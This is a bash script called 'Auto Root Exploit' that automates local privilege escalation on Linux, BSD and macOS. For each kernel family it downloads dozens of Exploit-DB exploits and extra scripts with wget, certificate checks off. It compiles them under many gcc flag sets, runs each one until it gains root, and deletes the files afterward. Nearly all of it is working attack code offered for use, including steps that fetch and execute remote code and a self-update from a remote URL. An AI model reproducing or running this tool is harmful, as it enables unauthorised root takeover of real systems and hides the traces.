#!/bin/bash

#All exploits are suggested by "exploitdb" and will update according to it.
#Name     : Auto Root
#Author   : Nilotpal Biswas
#Facebook : https://www.facebook.com/nilotpal.biswas.73
#Twitter  : https://twitter.com/nilotpalhacker
#USAGE    : bash autoroot.sh

ver=4.3
clear
echo "==================================================="
echo "              Auto Root Exploit v$ver"
echo "                by Nilotpal Biswas"
echo "==================================================="
checkroot() {
if [ $(id -u) == 0 ]; then
echo
echo "Successfully R00T(ed).. have fun :)"
echo "ID     => " $(id)
echo "WHOAMI => " $(whoami)
echo
exit
fi
}

ccmpl() {
arraycmpl=(
"exploit.c -lutil -lpthread"
"exploit.c -m32 -O2 -o exploit"
"exploit.c -o exploit"
"exploit.c -o exploit -lkeyutils -Wall"
"exploit.c -o exploit -lpthread"
"exploit.c -o exploit -pthread"
"exploit.c -o exploit -static -Wall"
"exploit.c -o exploit -Wall"
"-fPIC -shared -o exploit exploit.c -ldl -w"
"-O2 exploit.c -o exploit"
"-O2 -fomit-frame-pointer exploit.c -o exploit"
"-o exploit exploit.c -static -O2"
"-pthread exploit.c -o exploit -lcrypt"
"-Wall -m64 -o exploit exploit.c"
"-Wall -o exploit exploit.c"
)
for i in "${arraycmpl[@]}"
do
gcc $i >> /dev/null
./exploit
./a.out
checkroot
rm -rf exploit
rm -rf a.out
cc $i >> /dev/null
./exploit
./a.out
checkroot
rm -rf exploit
rm -rf a.out
sleep 1
done
rm -rf exploit.c
}
shcmpl(){
bash exploit.sh
checkroot;
rm -rf exploit.sh
rm -rf *.c
rm -rf *.out
}
pycmpl(){
python exploit.py
checkroot;
rm -rf exploit.py
rm -rf *.c
rm -rf *.out
}

function 2x {
checkroot
echo
echo "R00Ting.. wait"
echo "2.6"
#c
array26c=(
exploits/linux/local/2031.c
exploits/linux/local/17391.c
exploits/linux/local/18411.c
exploits/linux/local/33321.c
exploits/linux/local/35161.c
exploits/linux/local/5092.c
exploits/linux/local/8572.c
exploits/linux_x86/local/9542.c
exploits/linux/local/25202.c
exploits/linux/local/33322.c
exploits/linux/local/40812.c
exploits/linux/local/2013.c
exploits/linux/local/5093.c
exploits/linux/local/8673.c
exploits/linux_x86-64/local/9083.c
exploits/linux/local/10613.c
exploits/linux/local/2004.c
exploits/linux_x86-64/local/15024.c
exploits/linux/local/15704.c
exploits/linux/local/25444.c
exploits/linux/local/30604.c
exploits/linux/local/2005.c
exploits/linux/local/15285.c
exploits/linux/local/2006.c
exploits/linux/local/40616.c
exploits/linux/local/45516.c
exploits/linux/local/1397.c
exploits/linux/local/8678.c
exploits/linux/local/40839.c
)
for i in "${array26c[@]}"
do
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
ccmpl
done
#sh
array26sh=(
exploits/linux/local/2011.sh
exploits/linux/local/8478.sh
exploits/linux/local/10018.sh
)
for i in "${array26sh[@]}"
do
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.sh
shcmpl
done
#py
array26py=(
exploits/linux/local/12130.py
)
for i in "${array26py[@]}"
do
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.py
pycmpl
done
#txt
#exploits/linux/local/9191.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9191.tgz
tar -zxf 9191.tgz
cd cheddar_bay
bash cheddar_bay.sh
cc -fno-stack-protector -o exploit exploit.c
./exploit
checkroot;
cc -fno-stack-protector -DRHEL5_SUCKS -o exploit exploit.c
./exploit
checkroot;
cd ..
rm -rf cheddar_bay
rm -rf 9191.tgz
tar -zxf 33395.tgz
cd ext4_own
bash ext4_own.sh
cd ..
rm -rf ext4_own
rm -rf 33395.tgz
#exploits/linux/local/23674.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/xtra/23674.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
rm -rf a.c
rm -rf a
#exploits/linux/local/29714.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/29714.tgz
tar -zxf 29714.tgz
cd exploit
make
make install
checkroot;
cd ..
rm -rf exploit
rm -rf 29714.tgz
#exploits/linux/local/33395.txt
wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/33395.tgz
tar -zxf 33395.tgz
cd ext4_own
bash ext4_own.sh
checkroot;
cd ..
rm -rf ext4_own
rm -rf 33395.tgz
echo
echo "Srry.. I tried hard, but no luck this time.. Wait for update :("
}
function 3x {
checkroot
echo
echo "R00Ting.. wait"
echo "3.x"
#c
array3c=(
exploits/linux/local/37292.c
exploits/linux/local/33824.c
exploits/linux_x86-64/local/24555.c
exploits/linux/local/41995.c
exploits/linux_x86-64/local/24746.c
exploits/linux/local/33336.c
exploits/linux_x86-64/local/33516.c
exploits/linux/local/27297.c
exploits/linux_x86-64/local/31347.c
exploits/linux/local/42887.c
exploits/linux_x86-64/local/33589.c
exploits/linux/local/35370.c
exploits/linux/local/38390.c
)
for i in "${array3c[@]}"
do
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
ccmpl
done
#txt
#exploits/linux/local/37293.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/xtra/37293.sh -O exploit.sh
bash exploit.sh
checkroot;
rm -rf exploit.sh
rm -rf *.c
#exploits/linux/local/41999.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/41999.c -O exploit.c
gcc exploit.c -masm=intel
./a.out 0
checkroot;
./a.out 1
checkroot;
./a.out 2
checkroot;
./a.out 3
checkroot;
./a.out 4
checkroot;
./a.out 5
checkroot;
./a.out 6
checkroot;
./a.out 7
checkroot;
./a.out 8
checkroot;
./a.out 9
checkroot;
./a.out 10
checkroot;
rm a.out
rm exploit.c
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/41999.py -O exploit.py
python exploit.py
checkroot;
rm exploit.py
rm a.out
rm exploit
checkroot;
echo
echo "Srry.. I tried hard, but no luck this time.. Wait for update :("
}
function 4x {
checkroot
echo
echo "R00Ting.. wait"
echo "4.x"
#c
array4c=(
exploits/linux_x86-64/local/40871.c
exploits/linux/local/40003.c
exploits/linux/local/44303.c
exploits/linux/local/41994.c
exploits/linux/local/39166.c
exploits/linux/local/41886.c
exploits/linux/local/39277.c
exploits/linux/local/43127.c
exploits/linux/local/41458.c
exploits/linux_x86-64/local/40049.c
exploits/linux/local/43029.c
exploits/linux/local/39230.c
)
for i in "${array4c[@]}"
do
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
ccmpl
done
#txt
#exploits/linux/local/39772.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
cd 39772
unzip 39772.zip
tar -xf exploit.tar
cd ebpf_mapfd_doubleput_exploit
bash compile.sh
./hello
./doubleput
./suidhelper
cd ..
rm -rf ebpf_mapfd_doubleput_exploit
rm -rf exploit.tar
checkroot;
tar -xf crasher.tar
cd ebpf_mapfd_doubleput_crasher
bash compile.sh
./doubleput
cd ..
rm -rf ebpf_mapfd_doubleput_crasher
rm -rf 39772
rm -rf 39772.zip
checkroot;
#exploits/linux/local/40489.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40489.zip
unzip 40489.zip
cd 40489
bash compile.sh
./pwn
./enjoy
cd ..
rm -rf 40489
rm -rf 40489.zip
checkroot;
echo
echo "Srry.. I tried hard, but no luck this time.. Wait for update :("
}
function bsdx {
checkroot
echo
echo "R00Ting.. wait"
echo "bsd"
#c
arrayopnc=(
exploits/freebsd/local/7581.c
exploits/bsd/local/16951.c
exploits/freebsd/local/8261.c
exploits/freebsd/local/9082.c
exploits/freebsd/local/14002.c
exploits/unix/local/19203.c
exploits/bsd/local/3094.c
exploits/bsd/local/19545.c
exploits/bsd/local/286.c
exploits/bsd/local/287.c
exploits/freebsd/local/9488.c
exploits/freebsd/local/26368.c
exploits/freebsd/local/28718.c
exploits/bsd/local/29.c
exploits/openbsd/local/5979.c
)
for i in "${arrayopnc[@]}"
do
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
ccmpl
done
#txt
#exploits/bsd/local/8055.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/xtra/8055.c -O exploit.c
gcc -o exploit.o -c exploit.c -fPIC
gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 exploit.o -nostartfiles
./exploit.o
cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
./tmp/libno_ex.so.1.0
checkroot
#exploits/bsd/local/10255.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/xtra/10255.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
#exploits/freebsd/local/19756.txt
asmon -e "xterm"
checkroot
echo
echo "Srry.. I tried hard, but no luck this time.. Wait for update :("
}
function appx {
checkroot
echo
echo "R00Ting.. wait"
echo "apple"
#c
arraymacc=(
exploits/macos/local/45782.c
exploits/macos/dos/42056.c
exploits/macos/local/40957.c
)
for i in "${arraymacc[@]}"
do
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.c
ccmpl
done
#sh
arraymacsh=(
exploits/macos/local/43221.sh
exploits/macos/local/43222.sh
exploits/macos/local/43223.sh
exploits/macos/local/43224.sh
exploits/macos/local/43225.sh
exploits/macos/local/43926.sh
exploits/macos/local/43217.sh
exploits/macos/local/43218.sh
exploits/macos/local/43219.sh
exploits/macos/local/43220.sh
)
for i in "${arraymacsh[@]}"
do
wget -q --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/$i -O exploit.sh
shcmpl
done
#txt
#exploits/macos/local/42334.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/xtra/42334.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
#exploits/macos/local/42454.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/xtra/42454.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
#exploits/macos/local/45854.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/xtra/45854.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
rm -rf shell.c
rm -rf shell
#exploits/macos/local/45107.txt
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/xtra/45107.sh -O exploit.sh
bash exploit.sh
checkroot
rm -rf exploit.sh
rm -rf charles_exploit.c
rm -rf charles_exploit
#exploits/macos/local/40669.txt
wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/40669.zip
unzip 40669.zip
cd 40669/
clang -O3 -o task_nicely_t task_nicely_t.c
./task_nicely_t
checkroot
cd ..
rm -rf 40669
rm -rf __MACOSX
rm -rf 40669.zip
echo
echo "Srry.. I tried hard, but no luck this time.. Wait for update :("
}
function al {
2x
sleep 1
3x
sleep 1
4x
sleep 1
bsdx
sleep 1
appx
}
function updt {
echo "updating script.."
wget -q --no-check-certificate https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh -O $0
sleep 2
}

case "$1" in
2)
      2x
	;;
3)
      3x
	;;
4)
      4x
	;;
bsd)
      bsdx
	;;
app)
      appx
	;;
all)
      al
	;;
0)
      updt
        ;;
   *)


function s0 {
ck=$(wget https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh --timeout=5 -q -O - | grep "ver=" | cut -d"=" -f2)
mtach=$(echo $ck | cut -d" " -f1)
if [ "$mtach" != "$ver" ]; then
otp="0   | *an update is available"
else
otp="    | no update is available"
fi
}
ping -c 1 raw.githubusercontent.com  -i 1000 > /dev/null
  [ $? -eq 0 ] && s0
  [ $? -eq 1 ] && otp="*..Error checking update..*"

echo -e "
	Usage:
	┌──[$USER@`hostname`:~]
	└──╼ bash ""$0 {2|3|4|bsd|app|all|0}

           No. |     Commands list 
          ------------------------------------
           2   | for kernel version 2.6 all
           3   | for kernel version 3 all
           4   | for kernel version 4 all
           bsd | for freebsd & openbsd all
           app | for apple macos all
           all | for kernel 2.6,3,4 bsd & app all
           $otp
" 
ker=$(uname -r)
echo "  System Kernel ver =>" $ker
echo
>&2
exit 1
;;
esac

echo -e 
exit 0
